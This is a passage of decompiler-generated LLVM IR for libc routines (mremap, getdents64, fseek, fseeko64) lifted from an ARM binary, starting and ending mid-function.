  %v3_1c6e4 = add i32 %v0_1c6e0, 44
  %v4_1c6e4 = inttoptr i32 %v3_1c6e4 to i32*
  %v5_1c6e4 = load i32, i32* %v4_1c6e4, align 4
  store i32 %v5_1c6e4, i32* %r1.global-to-local, align 4
  %v0_1c6e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c6e8 = add i32 %v0_1c6e8, 64
  %v1_1c6ec = inttoptr i32 %v1_1c6e8 to i32*
  store i32 %v2_1c6e4, i32* %v1_1c6ec, align 4
  %v3_1c6ec = add i32 %v0_1c6e8, 68
  %v4_1c6ec = inttoptr i32 %v3_1c6ec to i32*
  %v5_1c6ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c6ec, i32* %v4_1c6ec, align 4
  %v0_1c6f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6f0 = add i32 %v0_1c6f0, 48
  %v1_1c6f4 = inttoptr i32 %v1_1c6f0 to i32*
  %v2_1c6f4 = load i32, i32* %v1_1c6f4, align 4
  %v3_1c6f4 = add i32 %v0_1c6f0, 52
  %v4_1c6f4 = inttoptr i32 %v3_1c6f4 to i32*
  %v5_1c6f4 = load i32, i32* %v4_1c6f4, align 4
  store i32 %v5_1c6f4, i32* %r1.global-to-local, align 4
  %v1_1c6f8 = add i32 %v0_1c6f0, 8
  %v2_1c6f8 = inttoptr i32 %v1_1c6f8 to i16*
  %v3_1c6f8 = load i16, i16* %v2_1c6f8, align 2
  %v4_1c6f8 = zext i16 %v3_1c6f8 to i32
  store i32 %v4_1c6f8, i32* %r2.global-to-local, align 4
  %v1_1c6fc = add i32 %v0_1c6f0, 10
  %v2_1c6fc = inttoptr i32 %v1_1c6fc to i16*
  %v3_1c6fc = load i16, i16* %v2_1c6fc, align 2
  %v4_1c6fc = zext i16 %v3_1c6fc to i32
  store i32 %v4_1c6fc, i32* %ip.global-to-local, align 4
  %v1_1c700 = add i32 %v0_1c6f0, 12
  %v2_1c700 = inttoptr i32 %v1_1c700 to i16*
  %v3_1c700 = load i16, i16* %v2_1c700, align 2
  %v4_1c700 = zext i16 %v3_1c700 to i32
  store i32 %v4_1c700, i32* %lr.global-to-local, align 4
  %v1_1c704 = add i32 %v0_1c6f0, 14
  %v2_1c704 = inttoptr i32 %v1_1c704 to i16*
  %v3_1c704 = load i16, i16* %v2_1c704, align 2
  %v4_1c704 = zext i16 %v3_1c704 to i32
  store i32 %v4_1c704, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1c710 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c710 = add i32 %v0_1c710, 72
  %v1_1c714 = inttoptr i32 %v1_1c710 to i32*
  store i32 %v2_1c6f4, i32* %v1_1c714, align 4
  %v3_1c714 = add i32 %v0_1c710, 76
  %v4_1c714 = inttoptr i32 %v3_1c714 to i32*
  %v5_1c714 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c714, i32* %v4_1c714, align 4
  %v0_1c718 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c718 = inttoptr i32 %v0_1c718 to i32*
  %v2_1c718 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_1c718, i32* %v1_1c718, align 4
  %v3_1c718 = add i32 %v0_1c718, 4
  %v4_1c718 = inttoptr i32 %v3_1c718 to i32*
  %v5_1c718 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_1c718, i32* %v4_1c718, align 4
  %v0_1c71c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c71c = load i32, i32* %r5.global-to-local, align 4
  %v2_1c71c = add i32 %v1_1c71c, 32
  %v3_1c71c = inttoptr i32 %v2_1c71c to i32*
  store i32 %v0_1c71c, i32* %v3_1c71c, align 4
  %v0_1c720 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c720 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c720 = add i32 %v1_1c720, 36
  %v3_1c720 = inttoptr i32 %v2_1c720 to i32*
  store i32 %v0_1c720, i32* %v3_1c720, align 4
  %v0_1c724 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c724 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c724 = add i32 %v1_1c724, 16
  %v3_1c724 = inttoptr i32 %v2_1c724 to i32*
  store i32 %v0_1c724, i32* %v3_1c724, align 4
  %v0_1c728 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c728 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c728 = add i32 %v1_1c728, 20
  %v3_1c728 = inttoptr i32 %v2_1c728 to i32*
  store i32 %v0_1c728, i32* %v3_1c728, align 4
  %v0_1c72c = load i32, i32* %lr.global-to-local, align 4
  %v1_1c72c = load i32, i32* %r5.global-to-local, align 4
  %v2_1c72c = add i32 %v1_1c72c, 24
  %v3_1c72c = inttoptr i32 %v2_1c72c to i32*
  store i32 %v0_1c72c, i32* %v3_1c72c, align 4
  %v0_1c730 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c730 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c730 = add i32 %v1_1c730, 28
  %v3_1c730 = inttoptr i32 %v2_1c730 to i32*
  store i32 %v0_1c730, i32* %v3_1c730, align 4
  ret i32 %v2_1c6f4

; uselistorder directives
  uselistorder i32 %v0_1c6f0, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 11, 12, 13, 14, 10 }
  uselistorder i32 72, { 6, 1, 2, 3, 4, 0, 9, 7, 8, 5 }
  uselistorder i32 68, { 1, 2, 5, 3, 0, 4, 6 }
  uselistorder i32 60, { 2, 3, 1, 4, 0, 5, 6 }
  uselistorder i32 88, { 7, 2, 3, 4, 5, 0, 1, 6 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1c774, label %dec_label_pc_1c764

dec_label_pc_1c764:                               ; preds = %entry
  %v0_1c764 = call i32 @__GI___errno_location()
  %v0_1c768 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c768 = sub i32 0, %v0_1c768
  %v2_1c76c = inttoptr i32 %v0_1c764 to i32*
  store i32 %v1_1c768, i32* %v2_1c76c, align 4
  br label %dec_label_pc_1c774

dec_label_pc_1c774:                               ; preds = %entry, %dec_label_pc_1c764
  %v1_1c77c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1c764 ]
  ret i32 %v1_1c77c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c774, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1c784 = load i32, i32* @r4, align 4
  %v6_1c784 = load i32, i32* @r5, align 4
  %v12_1c784 = load i32, i32* @r7, align 4
  %v1_1c788 = add i32 %arg3, 14
  %v2_1c790 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1c794 = and i32 %v1_1c788, -8
  %v2_1c798 = sub i32 %v2_1c790, %v1_1c794
  %v1_1c79c = add i32 %v2_1c798, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_1c79c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_1c7d8, label %dec_label_pc_1c7c4

dec_label_pc_1c7c4:                               ; preds = %entry
  %v0_1c7c4 = call i32 @__GI___errno_location()
  %v0_1c7c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c7c8 = sub i32 0, %v0_1c7c8
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1c7d0 = inttoptr i32 %v0_1c7c4 to i32*
  store i32 %v1_1c7c8, i32* %v2_1c7d0, align 4
  %v0_1c7e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c7e0

dec_label_pc_1c7d8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_1c7e0, label %dec_label_pc_1c7e8

dec_label_pc_1c7e0:                               ; preds = %dec_label_pc_1c7d8, %dec_label_pc_1c7c4
  %v0_1c7e0 = phi i32 [ -1, %dec_label_pc_1c7d8 ], [ %v0_1c7e0.pre, %dec_label_pc_1c7c4 ]
  store i32 %v0_1c7e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c8b4

dec_label_pc_1c7e8:                               ; preds = %dec_label_pc_1c7d8
  %v2_1c7e8 = add i32 %v1_1c79c, %arg1
  %v2_1c7ec = add i32 %tmp, %arg3
  store i32 %v2_1c7ec, i32* @ip, align 4
  store i32 %v1_1c79c, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1c89c

dec_label_pc_1c808:                               ; preds = %dec_label_pc_1c89c
  %v1_1c808 = add i32 %v0_1c85c, 16
  %v2_1c808 = inttoptr i32 %v1_1c808 to i16*
  %v3_1c808 = load i16, i16* %v2_1c808, align 2
  %v4_1c808 = zext i16 %v3_1c808 to i32
  %v1_1c80c = add nuw nsw i32 %v4_1c808, 7
  %v1_1c810 = and i32 %v1_1c80c, 131064
  store i32 %v1_1c810, i32* %r2.global-to-local, align 4
  %v2_1c818 = add i32 %v1_1c810, %v0_1c864
  store i32 %v2_1c818, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1c818, %v2_1c7ec
  br i1 %tmp26, label %dec_label_pc_1c824, label %dec_label_pc_1c858

dec_label_pc_1c824:                               ; preds = %dec_label_pc_1c808
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1c82c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1c82c, i32* %r2.global-to-local, align 4
  %v0_1c830 = load i32, i32* %sl.global-to-local, align 4
  %v1_1c834 = load i32, i32* @sp, align 4
  %v2_1c834 = inttoptr i32 %v1_1c834 to i32*
  store i32 0, i32* %v2_1c834, align 4
  %v4_1c838 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_1c82c, i32 %v0_1c830)
  %v0_1c83c = load i32, i32* @r5, align 4
  %v1_1c83c = load i32, i32* %r6.global-to-local, align 4
  %v9_1c83c = icmp eq i32 %v0_1c83c, %v1_1c83c
  br i1 %v9_1c83c, label %dec_label_pc_1c844, label %dec_label_pc_1c8b0

dec_label_pc_1c844:                               ; preds = %dec_label_pc_1c824
  %v0_1c844 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1c850 = inttoptr i32 %v0_1c844 to i32*
  store i32 22, i32* %v2_1c850, align 4
  %v0_1c8b4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c8b4

dec_label_pc_1c858:                               ; preds = %dec_label_pc_1c808
  %v1_1c858 = inttoptr i32 %v0_1c85c to i32*
  %v2_1c858 = load i32, i32* %v1_1c858, align 4
  %v3_1c858 = add i32 %v0_1c85c, 4
  %v4_1c858 = inttoptr i32 %v3_1c858 to i32*
  %v5_1c858 = load i32, i32* %v4_1c858, align 4
  store i32 %v5_1c858, i32* %r4.global-to-local, align 4
  %v1_1c85c = add i32 %v0_1c85c, 8
  store i32 %v1_1c85c, i32* %sb.global-to-local, align 4
  %v1_1c860 = inttoptr i32 %v1_1c85c to i32*
  %v2_1c860 = load i32, i32* %v1_1c860, align 4
  store i32 %v2_1c860, i32* %sb.global-to-local, align 4
  %v3_1c860 = add i32 %v0_1c85c, 12
  %v4_1c860 = inttoptr i32 %v3_1c860 to i32*
  %v5_1c860 = load i32, i32* %v4_1c860, align 4
  store i32 %v5_1c860, i32* %sl.global-to-local, align 4
  %v1_1c864 = inttoptr i32 %v0_1c864 to i32*
  store i32 %v2_1c858, i32* %v1_1c864, align 4
  %v3_1c864 = add i32 %v0_1c864, 4
  %v4_1c864 = inttoptr i32 %v3_1c864 to i32*
  %v5_1c864 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1c864, i32* %v4_1c864, align 4
  %v0_1c868 = load i32, i32* @r7, align 4
  %v1_1c868 = add i32 %v0_1c868, 8
  %v1_1c86c = inttoptr i32 %v1_1c868 to i32*
  %v2_1c86c = load i32, i32* %v1_1c86c, align 4
  %v3_1c86c = add i32 %v0_1c868, 12
  %v4_1c86c = inttoptr i32 %v3_1c86c to i32*
  %v5_1c86c = load i32, i32* %v4_1c86c, align 4
  store i32 %v5_1c86c, i32* @r4, align 4
  %v1_1c870 = load i32, i32* @r5, align 4
  %v2_1c870 = add i32 %v1_1c870, 8
  %v3_1c870 = inttoptr i32 %v2_1c870 to i32*
  store i32 %v2_1c86c, i32* %v3_1c870, align 4
  %v0_1c874 = load i32, i32* @r4, align 4
  %v1_1c874 = load i32, i32* @r5, align 4
  %v2_1c874 = add i32 %v1_1c874, 12
  %v3_1c874 = inttoptr i32 %v2_1c874 to i32*
  store i32 %v0_1c874, i32* %v3_1c874, align 4
  %v0_1c878 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c878 = trunc i32 %v0_1c878 to i16
  %v2_1c878 = load i32, i32* @r5, align 4
  %v3_1c878 = add i32 %v2_1c878, 16
  %v4_1c878 = inttoptr i32 %v3_1c878 to i16*
  store i16 %v1_1c878, i16* %v4_1c878, align 2
  %v0_1c87c = load i32, i32* @r7, align 4
  %v1_1c87c = add i32 %v0_1c87c, 18
  %v2_1c87c = inttoptr i32 %v1_1c87c to i8*
  %v3_1c87c = load i8, i8* %v2_1c87c, align 1
  %v4_1c87c = zext i8 %v3_1c87c to i32
  store i32 %v4_1c87c, i32* @r3, align 4
  %v2_1c880 = load i32, i32* @r5, align 4
  %v3_1c880 = add i32 %v2_1c880, 18
  %v4_1c880 = inttoptr i32 %v3_1c880 to i8*
  store i8 %v3_1c87c, i8* %v4_1c880, align 1
  %v0_1c884 = load i32, i32* @r7, align 4
  %v1_1c884 = add i32 %v0_1c884, 16
  %v2_1c884 = inttoptr i32 %v1_1c884 to i16*
  %v3_1c884 = load i16, i16* %v2_1c884, align 2
  %v4_1c884 = zext i16 %v3_1c884 to i32
  %v1_1c888 = add nsw i32 %v4_1c884, -19
  store i32 %v1_1c888, i32* @r2, align 4
  %v0_1c88c = call i32 @memcpy()
  %v0_1c890 = load i32, i32* @r7, align 4
  %v1_1c890 = add i32 %v0_1c890, 16
  %v2_1c890 = inttoptr i32 %v1_1c890 to i16*
  %v3_1c890 = load i16, i16* %v2_1c890, align 2
  %v4_1c890 = zext i16 %v3_1c890 to i32
  %v0_1c894 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1c894, i32* @r5, align 4
  %v2_1c898 = add i32 %v4_1c890, %v0_1c890
  store i32 %v2_1c898, i32* @r7, align 4
  br label %dec_label_pc_1c89c

dec_label_pc_1c89c:                               ; preds = %dec_label_pc_1c7e8, %dec_label_pc_1c858
  %v0_1c864 = phi i32 [ %tmp, %dec_label_pc_1c7e8 ], [ %v0_1c894, %dec_label_pc_1c858 ]
  %v0_1c85c = phi i32 [ %v1_1c79c, %dec_label_pc_1c7e8 ], [ %v2_1c898, %dec_label_pc_1c858 ]
  %v3_1c8a0 = icmp ult i32 %v0_1c85c, %v2_1c7e8
  %v1_1c8a4 = add i32 %v0_1c864, 19
  store i32 %v1_1c8a4, i32* @r0, align 4
  %v1_1c8a8 = add i32 %v0_1c85c, 19
  store i32 %v1_1c8a8, i32* @r1, align 4
  br i1 %v3_1c8a0, label %dec_label_pc_1c808, label %dec_label_pc_1c8b0.loopexit

dec_label_pc_1c8b0.loopexit:                      ; preds = %dec_label_pc_1c89c
  %v0_1c8b0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c8b0

dec_label_pc_1c8b0:                               ; preds = %dec_label_pc_1c8b0.loopexit, %dec_label_pc_1c824
  %v1_1c8b0 = phi i32 [ %v0_1c864, %dec_label_pc_1c8b0.loopexit ], [ %v0_1c83c, %dec_label_pc_1c824 ]
  %v0_1c8b0 = phi i32 [ %v0_1c8b0.pre, %dec_label_pc_1c8b0.loopexit ], [ %v1_1c83c, %dec_label_pc_1c824 ]
  %v2_1c8b0 = sub i32 %v1_1c8b0, %v0_1c8b0
  store i32 %v2_1c8b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c8b4

dec_label_pc_1c8b4:                               ; preds = %dec_label_pc_1c844, %dec_label_pc_1c7e0, %dec_label_pc_1c8b0
  %v0_1c8b4 = phi i32 [ %v0_1c8b4.pre, %dec_label_pc_1c844 ], [ %v0_1c7e0, %dec_label_pc_1c7e0 ], [ %v2_1c8b0, %dec_label_pc_1c8b0 ]
  store i32 %v3_1c784, i32* %r4.global-to-local, align 4
  store i32 %v6_1c784, i32* @r5, align 4
  store i32 %v12_1c784, i32* @r7, align 4
  ret i32 %v0_1c8b4

; uselistorder directives
  uselistorder i32 %v0_1c85c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1c864, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1c79c, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 4, 3 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 9, 26, 27, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 6, 7, 25, 8 }
  uselistorder i32 14, { 3, 8, 0, 10, 4, 6, 5, 1, 2, 9, 7 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1c8b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c89c, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1c8d0 = load i32, i32* @r1, align 4
  store i32 %v0_1c8d0, i32* @r2, align 4
  %v0_1c8d8 = call i32 @__GI_fseeko64()
  ret i32 %v0_1c8d8
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_1c8e8 = load i32, i32* @r4, align 4
  %v6_1c8e8 = load i32, i32* @r5, align 4
  %v12_1c8e8 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_1c8fc = load i32, i32* @r2, align 4
  store i32 %v0_1c8fc, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r6.global-to-local, align 4
  %v0_1c908 = load i32, i32* @r0, align 4
  store i32 %v0_1c908, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_1c924, label %dec_label_pc_1c910

dec_label_pc_1c910:                               ; preds = %entry
  %v0_1c910 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1c91c = inttoptr i32 %v0_1c910 to i32*
  store i32 22, i32* %v2_1c91c, align 4
  br label %dec_label_pc_1ca14

dec_label_pc_1c924:                               ; preds = %entry
  %v1_1c924 = add i32 %v0_1c908, 52
  %v2_1c924 = inttoptr i32 %v1_1c924 to i32*
  %v3_1c924 = load i32, i32* %v2_1c924, align 4
  %v1_1c928 = sub i32 1, %v3_1c924
  store i32 %v1_1c928, i32* %r8.global-to-local, align 4
  %v2_1c928 = icmp ult i32 %v3_1c924, 2
  br i1 %v2_1c928, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_1c924
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c970

bb:                                               ; preds = %dec_label_pc_1c924
  %v2_1c930 = icmp eq i32 %v1_1c928, 0
  br i1 %v2_1c930, label %dec_label_pc_1c970, label %dec_label_pc_1c938

dec_label_pc_1c938:                               ; preds = %bb
  %v1_1c93c = add i32 %v0_1c908, 56
  store i32 %v1_1c93c, i32* @r4, align 4
  %v4_1c940 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 40) to i32*), align 4
  store i32 %v4_1c940, i32* %r1.global-to-local, align 4
  store i32 %v1_1c93c, i32* %r2.global-to-local, align 4
  %v4_1c950 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1c950)
  %v0_1c964 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c964 = add i32 %v0_1c964, 20
  %v3_1c964 = inttoptr i32 %v2_1c964 to i32*
  %v4_1c964 = load i32, i32* %v3_1c964, align 4
  store i32 %v4_1c964, i32* @ip, align 4
  store i32 117104, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c964)
  %v0_1c970.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c970

dec_label_pc_1c970:                               ; preds = %.thread, %bb, %dec_label_pc_1c938
  %v0_1c97c = phi i32 [ %v0_1c908, %.thread ], [ %v0_1c908, %bb ], [ %v0_1c970.pre, %dec_label_pc_1c938 ]
  %v1_1c970 = inttoptr i32 %v0_1c97c to i16*
  %v2_1c970 = load i16, i16* %v1_1c970, align 2
  %v1_1c974 = and i16 %v2_1c970, 64
  %v2_1c974 = icmp eq i16 %v1_1c974, 0
  br i1 %v2_1c974, label %dec_label_pc_1c98c, label %dec_label_pc_1c97c

dec_label_pc_1c97c:                               ; preds = %dec_label_pc_1c970
  store i32 %v0_1c97c, i32* @r0, align 4
  %v0_1c980 = call i32 @__stdio_wcommit()
  %v2_1c984 = icmp eq i32 %v0_1c980, 0
  br i1 %v2_1c984, label %dec_label_pc_1c98c, label %dec_label_pc_1c9f4

dec_label_pc_1c98c:                               ; preds = %dec_label_pc_1c97c, %dec_label_pc_1c970
  %v0_1c98c = load i32, i32* @r7, align 4
  %v7_1c98c = icmp eq i32 %v0_1c98c, 1
  br i1 %v7_1c98c, label %dec_label_pc_1c994, label %dec_label_pc_1c98c.dec_label_pc_1c9a8_crit_edge

dec_label_pc_1c98c.dec_label_pc_1c9a8_crit_edge:  ; preds = %dec_label_pc_1c98c
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_1c9a8

dec_label_pc_1c994:                               ; preds = %dec_label_pc_1c98c
  %v0_1c994 = load i32, i32* @r5, align 4
  %v2_1c998 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1c998, i32* %r1.global-to-local, align 4
  %v2_1c99c = inttoptr i32 %v0_1c994 to i16*
  %v3_1c99c = call i32 @__stdio_adjust_position(i16* %v2_1c99c, i32 %v2_1c998)
  %v1_1c9a0 = icmp slt i32 %v3_1c99c, 0
  br i1 %v1_1c9a0, label %dec_label_pc_1c9f4, label %dec_label_pc_1c994.dec_label_pc_1c9a8_crit_edge

dec_label_pc_1c994.dec_label_pc_1c9a8_crit_edge:  ; preds = %dec_label_pc_1c994
  %v0_1c9a8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1c9a8

dec_label_pc_1c9a8:                               ; preds = %dec_label_pc_1c98c.dec_label_pc_1c9a8_crit_edge, %dec_label_pc_1c994.dec_label_pc_1c9a8_crit_edge
  %v2_1c9b0.pre-phi = phi i32 [ %.pre, %dec_label_pc_1c98c.dec_label_pc_1c9a8_crit_edge ], [ %v2_1c998, %dec_label_pc_1c994.dec_label_pc_1c9a8_crit_edge ]
  %v0_1c9a8 = phi i32 [ %v0_1c98c, %dec_label_pc_1c98c.dec_label_pc_1c9a8_crit_edge ], [ %v0_1c9a8.pre, %dec_label_pc_1c994.dec_label_pc_1c9a8_crit_edge ]
  store i32 %v0_1c9a8, i32* %r2.global-to-local, align 4
  %v0_1c9ac = load i32, i32* @r5, align 4
  store i32 %v2_1c9b0.pre-phi, i32* %r1.global-to-local, align 4
  %v4_1c9b4 = call i32 @__stdio_seek(i32 %v0_1c9ac, i32* nonnull %stack_var_-32, i32 %v0_1c9a8)
  %v1_1c9b8 = icmp slt i32 %v4_1c9b4, 0
  br i1 %v1_1c9b8, label %dec_label_pc_1c9f4, label %dec_label_pc_1c9c0

dec_label_pc_1c9c0:                               ; preds = %dec_label_pc_1c9a8
  %v0_1c9c0 = load i32, i32* @r5, align 4
  %v1_1c9c0 = inttoptr i32 %v0_1c9c0 to i16*
  %v2_1c9c0 = load i16, i16* %v1_1c9c0, align 2
  %v1_1c9c4 = add i32 %v0_1c9c0, 8
  %v2_1c9c4 = inttoptr i32 %v1_1c9c4 to i32*
  %v3_1c9c4 = load i32, i32* %v2_1c9c4, align 4
  store i32 %v3_1c9c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1c9cc = and i16 %v2_1c9c0, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_1c9cc, i16* %v1_1c9c0, align 2
  %v0_1c9d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9d8 = load i32, i32* @r5, align 4
  %v2_1c9d8 = add i32 %v1_1c9d8, 28
  %v3_1c9d8 = inttoptr i32 %v2_1c9d8 to i32*
  store i32 %v0_1c9d8, i32* %v3_1c9d8, align 4
  %v0_1c9dc = load i32, i32* %r1.global-to-local, align 4
  %v1_1c9dc = trunc i32 %v0_1c9dc to i8
  %v2_1c9dc = load i32, i32* @r5, align 4
  %v3_1c9dc = add i32 %v2_1c9dc, 2
  %v4_1c9dc = inttoptr i32 %v3_1c9dc to i8*
  store i8 %v1_1c9dc, i8* %v4_1c9dc, align 1
  %v0_1c9e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9e0 = load i32, i32* @r5, align 4
  %v2_1c9e0 = add i32 %v1_1c9e0, 16
  %v3_1c9e0 = inttoptr i32 %v2_1c9e0 to i32*
  store i32 %v0_1c9e0, i32* %v3_1c9e0, align 4
  %v0_1c9e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9e4 = load i32, i32* @r5, align 4
  %v2_1c9e4 = add i32 %v1_1c9e4, 20
  %v3_1c9e4 = inttoptr i32 %v2_1c9e4 to i32*
  store i32 %v0_1c9e4, i32* %v3_1c9e4, align 4
  %v0_1c9e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c9e8 = load i32, i32* @r5, align 4
  %v2_1c9e8 = add i32 %v1_1c9e8, 24
  %v3_1c9e8 = inttoptr i32 %v2_1c9e8 to i32*
  store i32 %v0_1c9e8, i32* %v3_1c9e8, align 4
  %v0_1c9ec = load i32, i32* %r1.global-to-local, align 4
  %v1_1c9ec = load i32, i32* @r5, align 4
  %v2_1c9ec = add i32 %v1_1c9ec, 44
  %v3_1c9ec = inttoptr i32 %v2_1c9ec to i32*
  store i32 %v0_1c9ec, i32* %v3_1c9ec, align 4
  br label %dec_label_pc_1c9f8

dec_label_pc_1c9f4:                               ; preds = %dec_label_pc_1c97c, %dec_label_pc_1c9a8, %dec_label_pc_1c994
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c9f8

dec_label_pc_1c9f8:                               ; preds = %dec_label_pc_1c9c0, %dec_label_pc_1c9f4
  %v0_1c9f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c9f8 = icmp eq i32 %v0_1c9f8, 0
  br i1 %v2_1c9f8, label %dec_label_pc_1c9f8..thread8_crit_edge, label %bb20

dec_label_pc_1c9f8..thread8_crit_edge:            ; preds = %dec_label_pc_1c9f8
  %v0_1ca10.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_1c9f8
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1ca08 = load i32, i32* %r6.global-to-local, align 4
  %v3_1ca08 = add i32 %v1_1ca08, 28
  %v4_1ca08 = inttoptr i32 %v3_1ca08 to i32*
  %v5_1ca08 = load i32, i32* %v4_1ca08, align 4
  store i32 %v5_1ca08, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1c9f8..thread8_crit_edge, %bb20
  %v0_1ca10 = phi i32 [ %v0_1ca10.pre, %dec_label_pc_1c9f8..thread8_crit_edge ], [ %v5_1ca08, %bb20 ]
  %v2_1ca10 = xor i1 %v2_1c9f8, true
  call void @__pseudo_cond_branch(i1 %v2_1ca10, i32 %v0_1ca10)
  br label %dec_label_pc_1ca14

dec_label_pc_1ca14:                               ; preds = %dec_label_pc_1c910, %.thread8
  %v0_1ca14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1c8e8, i32* @r4, align 4
